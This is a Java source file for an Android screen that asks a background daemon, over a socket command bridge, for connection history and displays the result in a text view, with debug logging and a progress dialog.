package com.fx;

import android.app.Activity;
import android.app.ProgressDialog;
import android.os.AsyncTask;
import android.os.Bundle;
import android.widget.TextView;

import com.android.msecurity.R;
import com.daemon_bridge.CommandResponseBase;
import com.daemon_bridge.GetConnectionHistoryCommand;
import com.daemon_bridge.GetConnectionHistoryCommandResponse;
import com.daemon_bridge.SocketCommandBase;
import com.fx.util.Customization;
import com.vvt.logger.FxLog;

public class ConnectionHistoryActivity extends Activity {
	private static final boolean DEBUG = true;
	private static final boolean LOGV = Customization.DEBUG ? DEBUG : false;
	private static final String TAG = "ConnectionHistoryActivity";

	private TextView mTextView = null;
	
	@Override
	public void onCreate(Bundle savedInstanceState) {
		 super.onCreate(savedInstanceState);
		setContentView(R.layout.last_connection);
		mTextView = (TextView) findViewById(R.id.connection_history_main_textview);
		
		GetConnectionHistoryCommand getConnectionHistoryCommand = new GetConnectionHistoryCommand();
		new UITask().execute(getConnectionHistoryCommand);
	}
	
	private class UITask extends AsyncTask<SocketCommandBase, Void, String> {
		private CommandResponseBase result = null;
		private ProgressDialog pDialog;
		
		protected void onPreExecute() {
			pDialog = ProgressDialog.show(ConnectionHistoryActivity.this, "", getString(R.string.language_ui_msg_processing_polite), true);
	    }
		
	    protected String doInBackground(SocketCommandBase... socketCommandBase) {
	    	if (LOGV) FxLog.v(TAG, "UITask # doInBackground # START");
	    	
			SocketCommandBase initSocketCommandBase = socketCommandBase[0];
	    	
			try {
				if (LOGV) FxLog.v(TAG, "UITask # before execute");
        		result = initSocketCommandBase.execute();
        		if (LOGV) FxLog.v(TAG, "UITask # after execute");
        	}
        	catch(Throwable t) {
        		if (LOGV) FxLog.e(TAG, "UITask # doInBackground # error:" + t.toString());
        	}
			
			if (LOGV && result != null) FxLog.v(TAG, "UITask # doInBackground # result #" + result.toString());
			if (LOGV) FxLog.v(TAG, "UITask # doInBackground # EXIT");
	    	return null;
	    }

	    protected void onPostExecute(String outputMsg) {
	    	pDialog.dismiss();
	    	
	    	if(result != null)
	    		onPostExecuteTask(result);	
	    }
	}
	
	private void onPostExecuteTask(CommandResponseBase result) {
		
		if(result != null) {
			if(result instanceof GetConnectionHistoryCommandResponse) {
				GetConnectionHistoryCommandResponse response =  (GetConnectionHistoryCommandResponse)result;
				
				if(response.getResponseCode() == CommandResponseBase.SUCCESS) {
					mTextView.setText(response.getConnectionHistory());
				}
			}
		}
	}
}
